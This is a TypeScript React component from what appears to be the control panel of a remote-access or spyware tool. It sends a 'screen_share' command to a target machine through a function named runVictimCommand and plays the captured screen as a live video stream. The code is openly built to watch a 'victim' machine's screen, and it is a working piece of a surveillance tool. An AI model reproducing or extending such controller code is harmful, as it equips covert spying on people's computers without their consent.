import React, { useEffect, useRef } from "react";
import { runVictimCommand } from "../../../service/api.service";
import { useLocation } from "react-router-dom";

const ScreenCapture: React.FC = () => {
  const location = useLocation();
  const videoRef = useRef<HTMLVideoElement | null>(null);

  useEffect(() => {
    // Define the video source URL (replace with your actual URL)
    const startBroadcast = async () => {
      const hash = location.hash;

      // Use a regular expression to find the 'id' query parameter in the hash
      const match = hash.match(/id=([^&]+)/);

      if (match) {
        // Extract the 'id' value from the matched result
        const clientId = match[1];

        const response = await runVictimCommand(
          clientId,
          "screen_share",
          "function"
        );

        console.log(response.data.output);
      }
    };
    startBroadcast();
    const videoSourceUrl = "http://localhost:8080";

    // Check if the video element exists
    if (videoRef.current) {
      // Set the video source
      videoRef.current.src = videoSourceUrl;

      // Play the video
      videoRef.current.play().catch((error) => {
        console.error("Error playing video:", error);
      });
    }
  }, []);

  return (
    <div>
      <h1 className="text-2xl font-bold mb-4">Screen Capture</h1>

      {/* Video Information */}
      <div className="mb-4">
        <p className="text-gray-600">Video Information:</p>
        <ul className="list-disc list-inside">
          <li>Resolution: 1920x1080</li>
          <li>Frame Rate: 30 FPS</li>
          <li>Codec: H.264</li>
        </ul>
      </div>

      {/* Video Player */}
      <div>
        <p className="text-gray-600">Live Video Stream:</p>
        <video
          ref={videoRef}
          className="w-full h-auto"
          controls
          poster="/placeholder-image.jpg" // Add a placeholder image
        >
          Your browser does not support the video tag.
        </video>
      </div>
    </div>
  );
};

export default ScreenCapture;
